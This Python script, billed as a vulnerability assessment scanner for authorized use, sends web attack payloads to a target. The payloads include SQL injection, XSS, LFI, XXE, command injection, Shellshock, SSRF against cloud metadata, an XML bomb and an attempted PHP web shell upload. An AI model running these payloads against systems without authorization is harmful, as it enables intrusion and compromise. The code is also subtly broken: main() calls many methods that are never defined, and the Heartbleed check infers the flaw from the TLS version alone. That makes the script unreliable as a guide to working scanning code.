#!/usr/bin/env python3
"""
VAPT Scanner - Vulnerability Assessment & Penetration Testing Tool
Educational/Authorized Use Only
"""
import socket
import requests
import argparse
import sys
import ssl
import hashlib
import re
import json
import base64
import dns.resolver
import dns.zone
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse, parse_qs
from datetime import datetime

class VAPTScanner:
    def __init__(self, target):
        self.target = target
        self.results = []
    
    def port_scan(self, ports=None):
        """Scan common ports"""
        if ports is None:
            ports = [21, 22, 23, 25, 80, 443, 3306, 3389, 5432, 8080]
        
        print(f"\n[*] Scanning ports on {self.target}")
        open_ports = []
        
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.target, port))
            if result == 0:
                open_ports.append(port)
                print(f"[+] Port {port} is OPEN")
            sock.close()
        
        return open_ports
    
    def http_header_check(self, url):
        """Check security headers"""
        print(f"\n[*] Checking HTTP security headers for {url}")
        try:
            resp = requests.get(url, timeout=5, verify=False)
            headers = resp.headers
            
            security_headers = {
                'X-Frame-Options': 'Missing',
                'X-Content-Type-Options': 'Missing',
                'Strict-Transport-Security': 'Missing',
                'Content-Security-Policy': 'Missing',
                'X-XSS-Protection': 'Missing'
            }
            
            for header in security_headers:
                if header in headers:
                    print(f"[+] {header}: {headers[header]}")
                else:
                    print(f"[-] {header}: MISSING (Vulnerability)")
            
            return security_headers
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def sql_injection_test(self, url):
        """Basic SQL injection detection"""
        print(f"\n[*] Testing for SQL injection on {url}")
        payloads = ["'", "1' OR '1'='1", "' OR 1=1--", "admin'--"]
        
        for payload in payloads:
            test_url = f"{url}?id={payload}"
            try:
                resp = requests.get(test_url, timeout=5)
                if any(err in resp.text.lower() for err in ['sql', 'mysql', 'syntax', 'database']):
                    print(f"[!] Potential SQLi vulnerability with payload: {payload}")
                    return True
            except:
                pass
        
        print("[+] No obvious SQL injection found")
        return False
    
    def xss_test(self, url):
        """Basic XSS detection"""
        print(f"\n[*] Testing for XSS on {url}")
        payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>"]
        
        for payload in payloads:
            test_url = f"{url}?q={payload}"
            try:
                resp = requests.get(test_url, timeout=5)
                if payload in resp.text:
                    print(f"[!] Potential XSS vulnerability detected")
                    return True
            except:
                pass
        
        print("[+] No obvious XSS found")
        return False
    
    def directory_scan(self, base_url):
        """Scan for common directories"""
        print(f"\n[*] Scanning directories on {base_url}")
        dirs = ['admin', 'login', 'backup', 'config', 'uploads', 'api', 'test', '.git']
        found = []
        
        for d in dirs:
            url = urljoin(base_url, d)
            try:
                resp = requests.get(url, timeout=3, allow_redirects=False)
                if resp.status_code in [200, 301, 302, 403]:
                    print(f"[+] Found: {url} (Status: {resp.status_code})")
                    found.append(url)
            except:
                pass
        
        return found
    
    def ssl_check(self, hostname):
        """Check SSL/TLS certificate"""
        print(f"\n[*] Checking SSL certificate for {hostname}")
        try:
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    print(f"[+] SSL Version: {ssock.version()}")
                    print(f"[+] Issuer: {dict(x[0] for x in cert['issuer'])}")
                    print(f"[+] Valid until: {cert['notAfter']}")
                    return True
        except Exception as e:
            print(f"[-] SSL Error: {e}")
            return False
    
    def subdomain_enum(self, domain):
        """Basic subdomain enumeration"""
        print(f"\n[*] Enumerating subdomains for {domain}")
        subdomains = ['www', 'mail', 'ftp', 'admin', 'api', 'dev', 'test', 'staging']
        found = []
        
        for sub in subdomains:
            hostname = f"{sub}.{domain}"
            try:
                socket.gethostbyname(hostname)
                print(f"[+] Found: {hostname}")
                found.append(hostname)
            except:
                pass
        
        return found
    
    def cms_detection(self, url):
        """Detect CMS/framework"""
        print(f"\n[*] Detecting CMS/Framework on {url}")
        try:
            resp = requests.get(url, timeout=5)
            content = resp.text.lower()
            headers = resp.headers
            
            cms_signatures = {
                'WordPress': ['wp-content', 'wp-includes'],
                'Joomla': ['joomla', '/components/'],
                'Drupal': ['drupal', '/sites/default/'],
                'Django': ['csrfmiddlewaretoken'],
                'Laravel': ['laravel_session'],
                'React': ['react', '__react']
            }
            
            for cms, signatures in cms_signatures.items():
                if any(sig in content for sig in signatures):
                    print(f"[+] Detected: {cms}")
                    return cms
            
            print("[+] CMS not identified")
            return None
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def robots_check(self, base_url):
        """Check robots.txt for sensitive paths"""
        print(f"\n[*] Checking robots.txt")
        try:
            resp = requests.get(urljoin(base_url, '/robots.txt'), timeout=5)
            if resp.status_code == 200:
                print(f"[+] robots.txt found:")
                disallowed = [line for line in resp.text.split('\n') if 'disallow' in line.lower()]
                for line in disallowed[:10]:
                    print(f"    {line.strip()}")
                return resp.text
            else:
                print("[-] robots.txt not found")
        except:
            print("[-] robots.txt not accessible")
        return None
    
    def cors_check(self, url):
        """Check CORS misconfiguration"""
        print(f"\n[*] Checking CORS policy")
        try:
            headers = {'Origin': 'https://evil.com'}
            resp = requests.get(url, headers=headers, timeout=5)
            acao = resp.headers.get('Access-Control-Allow-Origin')
            
            if acao == '*':
                print("[!] CORS misconfiguration: Allows all origins (*)")
                return True
            elif acao == 'https://evil.com':
                print("[!] CORS misconfiguration: Reflects arbitrary origin")
                return True
            else:
                print("[+] CORS properly configured")
                return False
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def clickjacking_test(self, url):
        """Test for clickjacking vulnerability"""
        print(f"\n[*] Testing for clickjacking")
        try:
            resp = requests.get(url, timeout=5)
            xfo = resp.headers.get('X-Frame-Options')
            csp = resp.headers.get('Content-Security-Policy', '')
            
            if not xfo and 'frame-ancestors' not in csp:
                print("[!] Vulnerable to clickjacking (no X-Frame-Options or CSP frame-ancestors)")
                return True
            else:
                print("[+] Protected against clickjacking")
                return False
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def open_redirect_test(self, url):
        """Test for open redirect"""
        print(f"\n[*] Testing for open redirect")
        payloads = ['//evil.com', 'https://evil.com', '//google.com']
        
        for payload in payloads:
            test_url = f"{url}?redirect={payload}"
            try:
                resp = requests.get(test_url, timeout=5, allow_redirects=False)
                if resp.status_code in [301, 302, 303, 307, 308]:
                    location = resp.headers.get('Location', '')
                    if 'evil.com' in location or 'google.com' in location:
                        print(f"[!] Open redirect found with payload: {payload}")
                        return True
            except:
                pass
        
        print("[+] No open redirect found")
        return False
    
    def info_disclosure(self, url):
        """Check for information disclosure"""
        print(f"\n[*] Checking for information disclosure")
        paths = ['/.env', '/.git/config', '/phpinfo.php', '/config.php', '/web.config']
        found = []
        
        for path in paths:
            test_url = urljoin(url, path)
            try:
                resp = requests.get(test_url, timeout=3)
                if resp.status_code == 200 and len(resp.content) > 0:
                    print(f"[!] Sensitive file exposed: {test_url}")
                    found.append(test_url)
            except:
                pass
        
        if not found:
            print("[+] No obvious information disclosure")
        return found
    
    def lfi_test(self, url):
        """Test for Local File Inclusion"""
        print(f"\n[*] Testing for LFI")
        payloads = ['../../../etc/passwd', '..\\..\\..\\windows\\win.ini', '/etc/passwd']
        
        for payload in payloads:
            test_url = f"{url}?file={payload}"
            try:
                resp = requests.get(test_url, timeout=5)
                if 'root:' in resp.text or '[extensions]' in resp.text:
                    print(f"[!] LFI vulnerability detected with: {payload}")
                    return True
            except:
                pass
        
        print("[+] No LFI found")
        return False
    
    def rfi_test(self, url):
        """Test for Remote File Inclusion"""
        print(f"\n[*] Testing for RFI")
        test_url = f"{url}?file=http://example.com/test.txt"
        try:
            resp = requests.get(test_url, timeout=5)
            if resp.status_code == 200:
                print("[!] Possible RFI vulnerability")
                return True
        except:
            pass
        
        print("[+] No RFI found")
        return False
    
    def xxe_test(self, url):
        """Test for XML External Entity injection"""
        print(f"\n[*] Testing for XXE")
        xxe_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>"""
        
        try:
            headers = {'Content-Type': 'application/xml'}
            resp = requests.post(url, data=xxe_payload, headers=headers, timeout=5)
            if 'root:' in resp.text:
                print("[!] XXE vulnerability detected")
                return True
        except:
            pass
        
        print("[+] No XXE found")
        return False
    
    def ssrf_test(self, url):
        """Test for Server-Side Request Forgery"""
        print(f"\n[*] Testing for SSRF")
        payloads = ['http://127.0.0.1', 'http://localhost', 'http://169.254.169.254/latest/meta-data/']
        
        for payload in payloads:
            test_url = f"{url}?url={payload}"
            try:
                resp = requests.get(test_url, timeout=5)
                if resp.status_code == 200 and len(resp.content) > 0:
                    print(f"[!] Possible SSRF with payload: {payload}")
                    return True
            except:
                pass
        
        print("[+] No SSRF found")
        return False
    
    def command_injection_test(self, url):
        """Test for command injection"""
        print(f"\n[*] Testing for command injection")
        payloads = ['; ls', '| whoami', '`id`', '$(whoami)']
        
        for payload in payloads:
            test_url = f"{url}?cmd={payload}"
            try:
                resp = requests.get(test_url, timeout=5)
                if any(indicator in resp.text.lower() for indicator in ['uid=', 'gid=', 'root', 'bin']):
                    print(f"[!] Command injection detected with: {payload}")
                    return True
            except:
                pass
        
        print("[+] No command injection found")
        return False
    
    def jwt_test(self, url):
        """Test JWT security"""
        print(f"\n[*] Testing JWT security")
        try:
            resp = requests.get(url, timeout=5)
            cookies = resp.cookies
            auth_header = resp.headers.get('Authorization', '')
            
            # Check for JWT in cookies or headers
            jwt_token = None
            for cookie in cookies:
                if 'jwt' in cookie.lower() or 'token' in cookie.lower():
                    jwt_token = cookies[cookie]
                    break
            
            if 'Bearer' in auth_header:
                jwt_token = auth_header.split('Bearer ')[-1]
            
            if jwt_token and jwt_token.count('.') == 2:
                parts = jwt_token.split('.')
                header = json.loads(base64.b64decode(parts[0] + '=='))
                
                if header.get('alg') == 'none':
                    print("[!] JWT uses 'none' algorithm - Critical vulnerability")
                    return True
                elif header.get('alg') == 'HS256':
                    print("[+] JWT uses HS256 (check for weak secrets separately)")
                
                print(f"[+] JWT algorithm: {header.get('alg')}")
        except:
            pass
        
        print("[+] No JWT issues detected")
        return False
    
    def http_methods_test(self, url):
        """Test for dangerous HTTP methods"""
        print(f"\n[*] Testing HTTP methods")
        methods = ['OPTIONS', 'PUT', 'DELETE', 'TRACE', 'CONNECT']
        dangerous = []
        
        for method in methods:
            try:
                resp = requests.request(method, url, timeout=5)
                if resp.status_code not in [405, 501]:
                    print(f"[!] {method} method is enabled")
                    dangerous.append(method)
            except:
                pass
        
        if not dangerous:
            print("[+] No dangerous HTTP methods enabled")
        return dangerous
    
    def security_txt_check(self, base_url):
        """Check for security.txt file"""
        print(f"\n[*] Checking for security.txt")
        paths = ['/.well-known/security.txt', '/security.txt']
        
        for path in paths:
            try:
                resp = requests.get(urljoin(base_url, path), timeout=5)
                if resp.status_code == 200:
                    print(f"[+] security.txt found at {path}")
                    print(resp.text[:200])
                    return True
            except:
                pass
        
        print("[-] security.txt not found")
        return False
    
    def api_endpoint_scan(self, base_url):
        """Scan for common API endpoints"""
        print(f"\n[*] Scanning API endpoints")
        endpoints = ['/api/v1', '/api/v2', '/graphql', '/swagger', '/api-docs', 
                    '/api/users', '/api/admin', '/rest/api', '/api/config']
        found = []
        
        for endpoint in endpoints:
            url = urljoin(base_url, endpoint)
            try:
                resp = requests.get(url, timeout=3)
                if resp.status_code in [200, 401, 403]:
                    print(f"[+] API endpoint found: {url} (Status: {resp.status_code})")
                    found.append(url)
            except:
                pass
        
        return found
    
    def backup_file_scan(self, base_url):
        """Scan for backup files"""
        print(f"\n[*] Scanning for backup files")
        parsed = urlparse(base_url)
        base_path = parsed.path.rstrip('/')
        
        extensions = ['.bak', '.old', '.backup', '.zip', '.tar.gz', '~', '.swp']
        files = ['index', 'config', 'database', 'db', 'backup', 'admin']
        found = []
        
        for file in files:
            for ext in extensions:
                url = urljoin(base_url, f"{file}{ext}")
                try:
                    resp = requests.get(url, timeout=2)
                    if resp.status_code == 200:
                        print(f"[!] Backup file found: {url}")
                        found.append(url)
                except:
                    pass
        
        if not found:
            print("[+] No backup files found")
        return found
    
    def cookie_security_check(self, url):
        """Check cookie security attributes"""
        print(f"\n[*] Checking cookie security")
        try:
            resp = requests.get(url, timeout=5)
            cookies = resp.cookies
            
            if not cookies:
                print("[-] No cookies set")
                return None
            
            for cookie in cookies:
                print(f"\n[*] Cookie: {cookie.name}")
                if not cookie.secure:
                    print(f"  [!] Missing Secure flag")
                if not cookie.has_nonstandard_attr('HttpOnly'):
                    print(f"  [!] Missing HttpOnly flag")
                if not cookie.has_nonstandard_attr('SameSite'):
                    print(f"  [!] Missing SameSite attribute")
                
            return True
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def dns_zone_transfer(self, domain):
        """Test for DNS zone transfer vulnerability"""
        print(f"\n[*] Testing DNS zone transfer for {domain}")
        try:
            import dns.query
            ns_records = dns.resolver.resolve(domain, 'NS')
            for ns in ns_records:
                ns_server = str(ns).rstrip('.')
                try:
                    zone = dns.zone.from_xfr(dns.query.xfr(ns_server, domain))
                    if zone:
                        print(f"[!] Zone transfer successful from {ns_server}")
                        return True
                except:
                    pass
            
            print("[+] Zone transfer not allowed")
            return False
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def shellshock_test(self, url):
        """Test for Shellshock vulnerability"""
        print(f"\n[*] Testing for Shellshock")
        payload = "() { :; }; echo; echo vulnerable"
        headers = {
            'User-Agent': payload,
            'Referer': payload,
            'Cookie': payload
        }
        
        try:
            resp = requests.get(url, headers=headers, timeout=5)
            if 'vulnerable' in resp.text:
                print("[!] Shellshock vulnerability detected")
                return True
            
            print("[+] Not vulnerable to Shellshock")
            return False
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def heartbleed_test(self, hostname):
        """Basic Heartbleed detection"""
        print(f"\n[*] Testing for Heartbleed")
        try:
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=5) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    version = ssock.version()
                    if version in ['TLSv1', 'TLSv1.1']:
                        print(f"[!] Using {version} - potentially vulnerable to Heartbleed")
                        return True
                    else:
                        print(f"[+] Using {version} - not vulnerable")
                        return False
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def http_request_smuggling(self, url):
        """Test for HTTP request smuggling"""
        print(f"\n[*] Testing for HTTP request smuggling")
        
        # CL.TE payload
        payload = "GET / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG"
        
        try:
            parsed = urlparse(url)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((parsed.hostname, parsed.port or 80))
            sock.send(payload.encode())
            response = sock.recv(4096)
            sock.close()
            
            if response:
                print("[!] Server may be vulnerable to request smuggling")
                return True
        except:
            pass
        
        print("[+] No request smuggling detected")
        return False
    
    def crlf_injection_test(self, url):
        """Test for CRLF injection"""
        print(f"\n[*] Testing for CRLF injection")
        payloads = [
            '%0d%0aSet-Cookie:test=injected',
            '%0aSet-Cookie:test=injected',
            '\r\nSet-Cookie:test=injected'
        ]
        
        for payload in payloads:
            test_url = f"{url}?redirect={payload}"
            try:
                resp = requests.get(test_url, timeout=5, allow_redirects=False)
                if 'test=injected' in str(resp.headers):
                    print(f"[!] CRLF injection found with: {payload}")
                    return True
            except:
                pass
        
        print("[+] No CRLF injection found")
        return False
    
    def xml_bomb_test(self, url):
        """Test for XML bomb (Billion Laughs)"""
        print(f"\n[*] Testing for XML bomb vulnerability")
        xml_bomb = """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<lolz>&lol3;</lolz>"""
        
        try:
            headers = {'Content-Type': 'application/xml'}
            resp = requests.post(url, data=xml_bomb, headers=headers, timeout=3)
            print("[+] Server handled XML bomb safely")
            return False
        except requests.exceptions.Timeout:
            print("[!] Server timeout - possible XML bomb vulnerability")
            return True
        except:
            print("[+] No XML bomb vulnerability")
            return False
    
    def graphql_introspection(self, url):
        """Test GraphQL introspection"""
        print(f"\n[*] Testing GraphQL introspection")
        query = {"query": "{__schema{types{name}}}"}
        
        graphql_paths = ['/graphql', '/api/graphql', '/v1/graphql']
        
        for path in graphql_paths:
            test_url = urljoin(url, path)
            try:
                resp = requests.post(test_url, json=query, timeout=5)
                if resp.status_code == 200 and '__schema' in resp.text:
                    print(f"[!] GraphQL introspection enabled at {test_url}")
                    return True
            except:
                pass
        
        print("[+] GraphQL introspection not found or disabled")
        return False
    
    def websocket_test(self, url):
        """Test WebSocket security"""
        print(f"\n[*] Testing WebSocket security")
        ws_url = url.replace('http://', 'ws://').replace('https://', 'wss://')
        
        try:
            # Check for WebSocket upgrade
            headers = {
                'Upgrade': 'websocket',
                'Connection': 'Upgrade',
                'Sec-WebSocket-Key': base64.b64encode(b'test').decode(),
                'Sec-WebSocket-Version': '13'
            }
            resp = requests.get(url, headers=headers, timeout=5)
            
            if resp.status_code == 101:
                print("[!] WebSocket endpoint found - manual testing recommended")
                return True
            
            print("[+] No WebSocket endpoint detected")
            return False
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def content_type_confusion(self, url):
        """Test for Content-Type confusion"""
        print(f"\n[*] Testing for Content-Type confusion")
        
        try:
            # Upload HTML as image
            files = {'file': ('test.jpg', '<script>alert(1)</script>', 'image/jpeg')}
            resp = requests.post(url, files=files, timeout=5)
            
            if '<script>' in resp.text:
                print("[!] Content-Type confusion vulnerability")
                return True
            
            print("[+] No Content-Type confusion detected")
            return False
        except:
            print("[+] Upload endpoint not found")
            return False
    
    def http_response_splitting(self, url):
        """Test for HTTP response splitting"""
        print(f"\n[*] Testing for HTTP response splitting")
        payload = "test%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK"
        test_url = f"{url}?param={payload}"
        
        try:
            resp = requests.get(test_url, timeout=5)
            if 'HTTP/1.1 200 OK' in resp.text:
                print("[!] HTTP response splitting vulnerability")
                return True
            
            print("[+] No response splitting found")
            return False
        except Exception as e:
            print(f"[!] Error: {e}")
            return None
    
    def subdomain_takeover_check(self, domain):
        """Check for subdomain takeover"""
        print(f"\n[*] Checking for subdomain takeover")
        
        vulnerable_cnames = [
            'github.io',
            'herokuapp.com',
            'azurewebsites.net',
            'cloudfront.net',
            's3.amazonaws.com'
        ]
        
        subdomains = ['www', 'dev', 'staging', 'test', 'api']
        
        for sub in subdomains:
            hostname = f"{sub}.{domain}"
            try:
                answers = dns.resolver.resolve(hostname, 'CNAME')
                for rdata in answers:
                    cname = str(rdata.target)
                    if any(vuln in cname for vuln in vulnerable_cnames):
                        # Check if it resolves
                        try:
                            socket.gethostbyname(cname)
                        except:
                            print(f"[!] Possible subdomain takeover: {hostname} -> {cname}")
                            return True
            except:
                pass
        
        print("[+] No subdomain takeover detected")
        return False
    
    def oauth_misconfiguration_test(self, url):
        """Test for OAuth/OIDC misconfiguration"""
        print(f"\n[*] Testing OAuth/OIDC misconfiguration")
        
        oauth_endpoints = ['/oauth/authorize', '/oauth/token', '/.well-known/openid-configuration']
        
        for endpoint in oauth_endpoints:
            test_url = urljoin(url, endpoint)
            try:
                # Test redirect_uri manipulation
                params = {'redirect_uri': 'https://evil.com', 'response_type': 'code'}
                resp = requests.get(test_url, params=params, timeout=5)
                
                if resp.status_code in [200, 302] and 'evil.com' in resp.text:
                    print(f"[!] OAuth redirect_uri not validated at {endpoint}")
                    return True
            except:
                pass
        
        print("[+] No OAuth misconfiguration detected")
        return False
    
    def rate_limiting_check(self, url):
        """Check for API rate limiting"""
        print(f"\n[*] Testing API rate limiting")
        
        try:
            responses = []
            for i in range(20):
                resp = requests.get(url, timeout=2)
                responses.append(resp.status_code)
            
            if all(status == 200 for status in responses):
                print("[!] No rate limiting detected - vulnerable to brute force")
                return True
            elif 429 in responses:
                print("[+] Rate limiting is active (429 Too Many Requests)")
                return False
        except:
            pass
        
        print("[+] Rate limiting check completed")
        return False
    
    def idor_test(self, url):
        """Test for Insecure Direct Object Reference"""
        print(f"\n[*] Testing for IDOR")
        
        # Test sequential IDs
        test_ids = ['1', '2', '100', '999', '1000']
        
        for test_id in test_ids:
            test_url = f"{url}?id={test_id}"
            try:
                resp = requests.get(test_url, timeout=5)
                if resp.status_code == 200 and len(resp.content) > 0:
                    print(f"[!] Possible IDOR - ID {test_id} accessible")
                    return True
            except:
                pass
        
        print("[+] No obvious IDOR found")
        return False
    
    def ssi_injection_test(self, url):
        """Test for Server-Side Include injection"""
        print(f"\n[*] Testing for SSI injection")
        
        payloads = [
            '<!--#exec cmd="ls"-->',
            '<!--#include virtual="/etc/passwd"-->',
            '<!--#echo var="DATE_LOCAL"-->'
        ]
        
        for payload in payloads:
            test_url = f"{url}?page={payload}"
            try:
                resp = requests.get(test_url, timeout=5)
                if any(indicator in resp.text for indicator in ['root:', 'bin/', 'Monday', 'Tuesday']):
                    print(f"[!] SSI injection detected with: {payload}")
                    return True
            except:
                pass
        
        print("[+] No SSI injection found")
        return False
    
    def xpath_injection_test(self, url):
        """Test for XPATH injection"""
        print(f"\n[*] Testing for XPATH injection")
        
        payloads = [
            "' or '1'='1",
            "' or 1=1 or ''='",
            "x' or 1=1 or 'x'='y",
            "admin' or '1'='1"
        ]
        
        for payload in payloads:
            test_url = f"{url}?user={payload}"
            try:
                resp = requests.get(test_url, timeout=5)
                if resp.status_code == 200 and len(resp.content) > 100:
                    print(f"[!] Possible XPATH injection with: {payload}")
                    return True
            except:
                pass
        
        print("[+] No XPATH injection found")
        return False
    
    def ip_spoofing_test(self, url):
        """Test for IP-based security bypass"""
        print(f"\n[*] Testing IP spoofing/bypass")
        
        headers_to_test = {
            'X-Forwarded-For': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'X-Originating-IP': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Client-IP': '127.0.0.1'
        }
        
        try:
            normal_resp = requests.get(url, timeout=5)
            
            for header, value in headers_to_test.items():
                resp = requests.get(url, headers={header: value}, timeout=5)
                if resp.status_code != normal_resp.status_code or len(resp.content) != len(normal_resp.content):
                    print(f"[!] IP-based bypass possible via {header}")
                    return True
        except:
            pass
        
        print("[+] No IP spoofing bypass detected")
        return False
    
    def weak_crypto_check(self, url):
        """Check for weak cryptographic implementations"""
        print(f"\n[*] Checking for weak cryptography")
        
        try:
            resp = requests.get(url, timeout=5)
            content = resp.text
            
            # Check for weak hashes and encoding
            weak_patterns = [
                (r'[a-f0-9]{32}', 'MD5 hash'),
                (r'[a-f0-9]{40}', 'SHA1 hash'),
                (r'Basic [A-Za-z0-9+/=]+', 'Basic Auth (Base64)'),
            ]
            
            for pattern, desc in weak_patterns:
                if re.search(pattern, content):
                    print(f"[!] Possible {desc} detected in response")
                    return True
        except:
            pass
        
        print("[+] No obvious weak crypto detected")
        return False
    
    def session_fixation_test(self, url):
        """Test for session fixation"""
        print(f"\n[*] Testing for session fixation")
        
        try:
            # Get initial session
            resp1 = requests.get(url, timeout=5)
            cookies1 = resp1.cookies
            
            if not cookies1:
                print("[-] No session cookies found")
                return False
            
            # Try to set custom session
            custom_session = {'sessionid': 'attacker_controlled_session'}
            resp2 = requests.get(url, cookies=custom_session, timeout=5)
            
            if resp2.status_code == 200:
                print("[!] Session fixation possible - accepts arbitrary session IDs")
                return True
        except:
            pass
        
        print("[+] No session fixation detected")
        return False
    
    def mixed_content_check(self, url):
        """Check for mixed content (HTTP resources on HTTPS)"""
        print(f"\n[*] Checking for mixed content")
        
        if not url.startswith('https://'):
            print("[-] Not an HTTPS site")
            return False
        
        try:
            resp = requests.get(url, timeout=5)
            content = resp.text.lower()
            
            # Look for HTTP resources
            http_patterns = ['src="http://', 'href="http://', "src='http://", "href='http://"]
            
            for pattern in http_patterns:
                if pattern in content:
                    print(f"[!] Mixed content detected - HTTP resources on HTTPS page")
                    return True
        except:
            pass
        
        print("[+] No mixed content detected")
        return False
    
    def file_upload_test(self, url):
        """Test file upload vulnerabilities"""
        print(f"\n[*] Testing file upload security")
        
        # Test various file types
        test_files = [
            ('shell.php', '<?php system($_GET["cmd"]); ?>', 'application/x-php'),
            ('test.php.jpg', '<?php phpinfo(); ?>', 'image/jpeg'),
            ('test.svg', '<svg onload=alert(1)>', 'image/svg+xml')
        ]
        
        for filename, content, mime_type in test_files:
            try:
                files = {'file': (filename, content, mime_type)}
                resp = requests.post(url, files=files, timeout=5)
                
                if resp.status_code in [200, 201]:
                    print(f"[!] File upload accepted: {filename}")
                    return True
            except:
                pass
        
        print("[+] File upload endpoint not found or secured")
        return False
    
    def api_auth_bypass_test(self, url):
        """Test API authentication bypass"""
        print(f"\n[*] Testing API authentication bypass")
        
        api_paths = ['/api/users', '/api/admin', '/api/config', '/api/v1/users']
        
        for path in api_paths:
            test_url = urljoin(url, path)
            try:
                # Test without authentication
                resp = requests.get(test_url, timeout=5)
                
                if resp.status_code == 200 and len(resp.content) > 0:
                    print(f"[!] API endpoint accessible without auth: {test_url}")
                    return True
            except:
                pass
        
        print("[+] API authentication appears enforced")
        return False
    
    def timing_attack_test(self, url):
        """Test for timing attack vulnerabilities"""
        print(f"\n[*] Testing for timing attacks")
        
        import time
        
        try:
            # Test with valid-looking vs invalid input
            start1 = time.time()
            requests.get(f"{url}?user=admin&pass=validpassword123", timeout=5)
            time1 = time.time() - start1
            
            start2 = time.time()
            requests.get(f"{url}?user=admin&pass=x", timeout=5)
            time2 = time.time() - start2
            
            # Significant timing difference
            if abs(time1 - time2) > 0.5:
                print(f"[!] Timing difference detected: {abs(time1-time2):.2f}s - possible timing attack")
                return True
        except:
            pass
        
        print("[+] No significant timing differences detected")
        return False
    
    def prototype_pollution_test(self, url):
        """Test for prototype pollution"""
        print(f"\n[*] Testing for prototype pollution")
        
        payloads = [
            '?__proto__[admin]=true',
            '?constructor.prototype.admin=true',
            '?__proto__.isAdmin=true'
        ]
        
        for payload in payloads:
            test_url = f"{url}{payload}"
            try:
                resp = requests.get(test_url, timeout=5)
                if resp.status_code == 200:
                    print(f"[!] Possible prototype pollution with: {payload}")
                    return True
            except:
                pass
        
        print("[+] No prototype pollution detected")
        return False
    
    def mass_assignment_test(self, url):
        """Test for mass assignment vulnerability"""
        print(f"\n[*] Testing for mass assignment")
        
        # Try to inject admin/role parameters
        payloads = [
            {'isAdmin': 'true', 'role': 'admin'},
            {'admin': '1', 'privilege': 'admin'},
            {'user_role': 'administrator'}
        ]
        
        for payload in payloads:
            try:
                resp = requests.post(url, json=payload, timeout=5)
                if resp.status_code in [200, 201]:
                    print(f"[!] Mass assignment possible - server accepts: {list(payload.keys())}")
                    return True
            except:
                pass
        
        print("[+] No mass assignment detected")
        return False

def main():
    parser = argparse.ArgumentParser(description='VAPT Scanner - Educational Use Only')
    parser.add_argument('-t', '--target', required=True, help='Target IP or domain')
    parser.add_argument('-u', '--url', help='Target URL for web tests')
    parser.add_argument('-p', '--ports', action='store_true', help='Run port scan')
    parser.add_argument('-w', '--web', action='store_true', help='Run web vulnerability tests')
    parser.add_argument('-s', '--ssl', action='store_true', help='Check SSL certificate')
    parser.add_argument('-d', '--subdomain', action='store_true', help='Enumerate subdomains')
    parser.add_argument('-a', '--all', action='store_true', help='Run all tests')
    
    args = parser.parse_args()
    
    print("="*60)
    print("VAPT Scanner - Vulnerability Assessment Tool")
    print("Educational/Authorized Use Only")
    print("="*60)
    
    scanner = VAPTScanner(args.target)
    
    if args.all or args.ports:
        scanner.port_scan()
    
    if args.all or args.ssl:
        scanner.ssl_check(args.target)
        scanner.weak_cipher_check(args.target)
        scanner.heartbleed_test(args.target)
    
    if args.all or args.subdomain:
        scanner.subdomain_enum(args.target)
        scanner.subdomain_takeover_check(args.target)
        scanner.dns_zone_transfer(args.target)
    
    if args.url and (args.all or args.web):
        scanner.http_header_check(args.url)
        scanner.version_disclosure_check(args.url)
        scanner.cms_detection(args.url)
        scanner.robots_check(args.url)
        scanner.security_txt_check(args.url)
        scanner.sql_injection_test(args.url)
        scanner.nosql_injection_test(args.url)
        scanner.ldap_injection_test(args.url)
        scanner.xss_test(args.url)
        scanner.lfi_test(args.url)
        scanner.rfi_test(args.url)
        scanner.path_traversal_test(args.url)
        scanner.xxe_test(args.url)
        scanner.xml_bomb_test(args.url)
        scanner.ssrf_test(args.url)
        scanner.ssti_test(args.url)
        scanner.command_injection_test(args.url)
        scanner.email_injection_test(args.url)
        scanner.crlf_injection_test(args.url)
        scanner.shellshock_test(args.url)
        scanner.cors_check(args.url)
        scanner.clickjacking_test(args.url)
        scanner.open_redirect_test(args.url)
        scanner.jwt_test(args.url)
        scanner.http_methods_test(args.url)
        scanner.cookie_security_check(args.url)
        scanner.deserialization_test(args.url)
        scanner.hpp_test(args.url)
        scanner.host_header_injection_test(args.url)
        scanner.cache_poisoning_test(args.url)
        scanner.http_request_smuggling(args.url)
        scanner.http_response_splitting(args.url)
        scanner.content_type_confusion(args.url)
        scanner.graphql_introspection(args.url)
        scanner.websocket_test(args.url)
        scanner.oauth_misconfiguration_test(args.url)
        scanner.rate_limiting_check(args.url)
        scanner.idor_test(args.url)
        scanner.ssi_injection_test(args.url)
        scanner.xpath_injection_test(args.url)
        scanner.ip_spoofing_test(args.url)
        scanner.weak_crypto_check(args.url)
        scanner.session_fixation_test(args.url)
        scanner.mixed_content_check(args.url)
        scanner.file_upload_test(args.url)
